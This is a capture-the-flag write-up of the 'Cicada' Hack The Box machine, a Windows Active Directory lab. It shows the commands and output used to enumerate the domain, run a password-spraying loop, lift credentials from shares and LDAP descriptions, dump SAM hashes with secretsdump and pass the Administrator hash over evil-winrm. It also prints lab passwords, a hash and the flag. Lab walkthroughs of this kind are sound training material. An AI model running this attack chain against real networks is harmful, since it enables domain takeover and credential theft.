---
name: Cicada
difficulty: Easy
author: theblxckcicada
dateAttempted: 10/13/24
tags:
  - windows
  - winrm
  - active-directory
flag: 9668a9dbfd79509169398cbe43f4151a
flagProtected: false
---

---
##### Chatbot logs:
- https://chatgpt.com/c/67097e61-3e0c-8012-935f-9d4d07e043f2
---
##### Enumeration:
`nmap -p- -Pn 10.10.11.35`
```python
# Nmap 7.94SVN scan initiated Sat Oct 12 01:05:41 2024 as: nmap -v -p- -Pn --min-rate=10000 -o initial.nmap 10.10.11.35  
Nmap scan report for 10.10.11.35  
Host is up (0.20s latency).  
Not shown: 65522 filtered tcp ports (no-response)  
PORT      STATE SERVICE  
53/tcp    open  domain  
88/tcp    open  kerberos-sec  
135/tcp   open  msrpc  
139/tcp   open  netbios-ssn  
389/tcp   open  ldap  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl  
3268/tcp  open  globalcatLDAP  
3269/tcp  open  globalcatLDAPssl  
5985/tcp  open  wsman  
56293/tcp open  unknown  
  
Read data files from: /usr/bin/../share/nmap  
# Nmap done at Sat Oct 12 01:06:02 2024 -- 1 IP address (1 host up) scanned in 21.18 seconds
```
*Note: This kind of port scan is very reminiscent of an AD situation*

---
Checking `5985/tcp wsman`, online, we find a [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm) article:

"*[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx) is highlighted as a **protocol by Microsoft** that enables the **remote management of Windows systems** through HTTP(S), leveraging SOAP in the process. It's fundamentally powered by WMI, presenting itself as an HTTP-based interface for WMI operations.*
...
*The presence of WinRM on a machine allows for straightforward remote administration via PowerShell, **akin to how SSH works for other operating systems**.*"

Since I'm on linux, I'll have to use something called `powershell-ntlm`:
```bash
sudo docker run -it quickbreach/powershell-ntlm
```

Furthermore, on `-p389`:
```
# Nmap 7.94SVN scan initiated Sat Oct 12 02:09:03 2024 as: nmap -A -p389 -Pn -o p389.nmap cicada
Nmap scan report for cicada (10.10.11.35)
Host is up (0.16s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 12 02:09:20 2024 -- 1 IP address (1 host up) scanned in 16.58 seconds
```

set `/etc/hosts`
```
10.10.11.35 cicada cicada.htb
```

`nmap -Pn -n -sV --script "ldap* and not brute" -o script.nmap cicada`
```
# Nmap 7.94SVN scan initiated Sat Oct 12 10:16:01 2024 as: nmap -Pn -n -sV --script "ldap* and not brute" -o script.nmap cicada
Nmap scan report for cicada (10.10.11.35)
Host is up (0.23s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-12 11:46:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=cicada,DC=htb
|       ldapServiceName: cicada.htb:cicada-dc$@CICADA.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       serverName: CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       namingContexts: DC=cicada,DC=htb
|       namingContexts: CN=Configuration,DC=cicada,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=cicada,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=cicada,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 200775
|       dsServiceName: CN=NTDS Settings,CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb
|       dnsHostName: CICADA-DC.cicada.htb
|       defaultNamingContext: DC=cicada,DC=htb
|       currentTime: 20241012114715.0Z
|_      configurationNamingContext: CN=Configuration,DC=cicada,DC=htb
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=cicada,DC=htb
|       ldapServiceName: cicada.htb:cicada-dc$@CICADA.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       serverName: CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       namingContexts: DC=cicada,DC=htb
|       namingContexts: CN=Configuration,DC=cicada,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=cicada,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=cicada,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 200775
|       dsServiceName: CN=NTDS Settings,CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb
|       dnsHostName: CICADA-DC.cicada.htb
|       defaultNamingContext: DC=cicada,DC=htb
|       currentTime: 20241012114717.0Z
|_      configurationNamingContext: CN=Configuration,DC=cicada,DC=htb
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=cicada,DC=htb
|       ldapServiceName: cicada.htb:cicada-dc$@CICADA.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       serverName: CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       namingContexts: DC=cicada,DC=htb
|       namingContexts: CN=Configuration,DC=cicada,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=cicada,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=cicada,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 200775
|       dsServiceName: CN=NTDS Settings,CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb
|       dnsHostName: CICADA-DC.cicada.htb
|       defaultNamingContext: DC=cicada,DC=htb
|       currentTime: 20241012114715.0Z
|_      configurationNamingContext: CN=Configuration,DC=cicada,DC=htb
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=cicada,DC=htb
|       ldapServiceName: cicada.htb:cicada-dc$@CICADA.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       serverName: CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       namingContexts: DC=cicada,DC=htb
|       namingContexts: CN=Configuration,DC=cicada,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=cicada,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=cicada,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=cicada,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 200775
|       dsServiceName: CN=NTDS Settings,CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb
|       dnsHostName: CICADA-DC.cicada.htb
|       defaultNamingContext: DC=cicada,DC=htb
|       currentTime: 20241012114716.0Z
|_      configurationNamingContext: CN=Configuration,DC=cicada,DC=htb
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 12 10:17:18 2024 -- 1 IP address (1 host up) scanned in 77.57 seconds

```


`dig soa CICADA-DC.cicada.htb @cicada.htb` 
```
; <<>> DiG 9.18.28-0ubuntu0.24.04.1-Ubuntu <<>> soa CICADA-DC.cicada.htb @cicada.htb  
;; global options: +cmd  
;; Got answer:  
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 17236  
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 3  
  
;; OPT PSEUDOSECTION:  
; EDNS: version: 0, flags:; udp: 4000  
;; QUESTION SECTION:  
;CICADA-DC.cicada.htb.          IN      SOA  
  
;; AUTHORITY SECTION:  
cicada.htb.             3600    IN      SOA     CICADA-DC.cicada.htb. hostmaster.cicada.htb. 160 900 600 86400 3600  
  
;; ADDITIONAL SECTION:  
CICADA-DC.cicada.htb.   3600    IN      A       10.10.11.35  
CICADA-DC.cicada.htb.   3600    IN      AAAA    dead:beef::a6f3:b7:1527:df36  
  
;; Query time: 1107 msec  
;; SERVER: 10.10.11.35#53(cicada.htb) (UDP)  
;; WHEN: Sat Oct 12 11:56:46 IST 2024  
;; MSG SIZE  rcvd: 140
```

`
`smbclient --no-pass -L //cicada.htb `
```
       Sharename       Type      Comment  
       ---------       ----      -------  
       ADMIN$          Disk      Remote Admin  
       C$              Disk      Default share  
       DEV             Disk         
       HR              Disk         
       IPC$            IPC       Remote IPC  
       NETLOGON        Disk      Logon server share    
       SYSVOL          Disk      Logon server share    
SMB1 disabled -- no workgroup available
```
*Note: everything proceeded by `$` is locked*

`smbclient --no-pass //cicada.htb/DEV`
```
smb: \> dir
<ACCESS DENIED>
```

`smbclient --no-pass //cicada.htb/HR`
```powershell
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Mar 14 17:59:09 2024  
 ..                                  D        0  Thu Mar 14 17:51:29 2024  
 Notice from HR.txt                  A     1266  Wed Aug 28 23:01:48 2024  
  
               4168447 blocks of size 4096. 310287 blocks available
smb: \> get "Notice from HR.txt"
```

`cat "Notice from HR.txt"`
```
...  
Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.  

Your default password is: Cicada$M6Corpb*@Lp#nZp!8  
...
Best regards,  
Cicada Corp
```

so, our password is probably "Cicada$M6Corpb*@Lp#nZp!8"
Let's look for a username. we saw `hostmaster` before as the domain support email
- tried on everything, probably isnt an actual email.


`enum4linux cicada.htb -U`
```
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
```

`impacket: rpcdump.py -p135 10.10.11.35 | grep -E "MS-EFSRPC|MS-RPRN|MS-PAR"`
```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
``` 

May be vulnerable to *PetitPotam*:
`./PetitPotam.py 10.10.16.88 10.10.11.35`
```  
Trying pipe lsarpc  
[-] Connecting to ncacn_np:10.10.11.35[\PIPE\lsarpc]  
[+] Connected!  
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e  
[+] Successfully bound!  
[-] Sending EfsRpcOpenFileRaw!  
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!  
[+] OK! Using unpatched function!  
[-] Sending EfsRpcEncryptFileSrv!  
Something went wrong, check error status => SMB SessionError: code: 0xc00000b0 - STATUS_PIPE_DISCONNECTED - The specified named pipe is in the disconnected state.
```

---
Checking the Cicada Box forum apparently the "guest" user with no password works.

`smbclient -a -u "guest" cicada.htb`
```
===================( Users on cicada.htb via RID cycling (RIDS: 500-550,1000-1050) )===================  
  
  
[I] Found new SID:    
S-1-5-21-917908876-1423158569-3159038727  
  
[I] Found new SID:    
S-1-5-21-917908876-1423158569-3159038727  
  
[I] Found new SID:    
S-1-5-32  
  
[I] Found new SID:    
S-1-5-32  
  
[I] Found new SID:    
S-1-5-32  
  
[I] Found new SID:    
S-1-5-32  
  
[I] Found new SID:    
S-1-5-32  
  
[I] Found new SID:    
S-1-5-32  
  
[I] Found new SID:    
S-1-5-32  
  
[I] Found new SID:    
S-1-5-21-917908876-1423158569-3159038727  
  
[I] Found new SID:    
S-1-5-21-917908876-1423158569-3159038727  
  
[+] Enumerating users using SID S-1-5-21-47050115-2771739599-2321771406 and logon username 'guest', password ''  
  
S-1-5-21-47050115-2771739599-2321771406-500 CICADA-DC\Administrator (Local User)  
S-1-5-21-47050115-2771739599-2321771406-501 CICADA-DC\Guest (Local User)  
S-1-5-21-47050115-2771739599-2321771406-503 CICADA-DC\DefaultAccount (Local User)  
S-1-5-21-47050115-2771739599-2321771406-504 CICADA-DC\WDAGUtilityAccount (Local User)  
S-1-5-21-47050115-2771739599-2321771406-513 CICADA-DC\None (Domain Group)
```

*Relying on the SIDs found here via RID cycling was a bad idea, this range was incomplete.*

Lets try to login with the DefaultAccount, which *--didn't work--*. Infact, none of the `Local User`s worked. Clearly we need to look for more users, so lets try finding `SID`s some other way.

Let's try `lookupsid.py` by `impacket`

`lookupsid.py 10.10.11.35/guest:@10.10.11.35`
```
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.10.11.35
[*] StringBinding ncacn_np:10.10.11.35[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

We finally get some `SidTypeUser`s.

Let's make a list and try them one by one against the default password

`brute_login.sh`
```bash
#!/bin/bash
while IFS= read -r line
do
    #The default password, check if login is possible"
    smbclient -U "$line%Cicada\$M6Corpb*@Lp#nZp!8" \\\\cicada.htb/DEV
    echo "queried user: $line"
done < "users.txt"
```

`./brute_login.sh`
```
querying user: john.smoulder  
session setup failed: NT_STATUS_LOGON_FAILURE  
querying user: sarah.dantelia  
session setup failed: NT_STATUS_LOGON_FAILURE  
querying user: michael.wrightson  
Try "help" to get a list of possible commands.  
david.orelious: command not found  
emily.oscars: command not found
```

user `michael.wrightson` does not fail. let's try that.

Looks like we still can't access the `DEV` share with this, so lets dump the domain information instead with `ldapdomaindump`

`ldapdomaindump ldap://cicada.htb -u "CICADA\\michael.wrightson" -p "Cicada\$M6Corpb*@Lp#nZp\!8"`

This leads to the creation of a ton of files. Let's check the HTML ones with `firefox *.html`

in the `domain_users.html` and `domain_users_by_group.html` file we find the password for the user `CICADA\david.orelious` in their account description: 

```
Just in case I forget my password is aRt$Lp#7t*VQ!3
```

Let's try using this and access the DEV share:

`smbclient -U "CICADA/david.orelious%aRt\$Lp#7t*VQ\!3" //cicada.htb/DEV`
```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 18:01:39 2024
  ..                                  D        0  Thu Mar 14 17:51:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 22:58:22 2024

                4168447 blocks of size 4096. 51948 blocks available
```

`Backup_script.ps1`
```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

We now have the password for another user `CICADA\emily.oscars`: `Q!3@Lp#M6b*7t*Vt`

Trying this combination against the locked shares `ADMIN$`, `C$`, we see we now have access to both of them.

Looking inside `C$`, we find the user flag inside `\Users\emily.oscars.CICADA\Desktop\user.txt`

We also find some privesc software inside this directory, namely `winpeas`. I hate this, and it happens a lot on linux machines too. It tells you exactly what needs to be done next. Bad game design.

Anyway, we can now claim the `user` flag.

Next, lets try getting into through the `WinRM` service using these credentials (the service is available, as seen before)

```
docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/ps1_scripts/' -e '/exe_files/'

docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!'

sudo docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

Now, lets download the sam and system database files in the `Documents\` folder and check

Let's use `impacket/secretsdump.py`

`docker run -it --rm "impacket:latest" -v <location to sam and system hives>:/hives
```
/ # secretsdump.py -sam hives/sam -system hives/system LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

Now that we have the admin password hash, lets pass it using `Evil-WinRM`

`sudo docker run --rm -i --name evil-winrm oscarakaelvis/evil-winrm -i 10.10.11.35 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'`
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
whoami
cicada\administrator
```

Now, we can grab and submit the `root.txt` file from `..\Desktop`

---
# References
- [exploit.ph: AD Recon](https://exploit.ph/active-directory-recon-1.html)
- [Hacktricks: Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [HDKS: MSRPC Pentesting](https://exploit-notes.hdks.org/exploit/windows/protocol/msrpc-pentesting/)
- [HTB: Forest Writeup (ZeusCybersec)](https://sparshjazz.medium.com/hackthebox-forest-writeup-active-directory-51e009f347c5)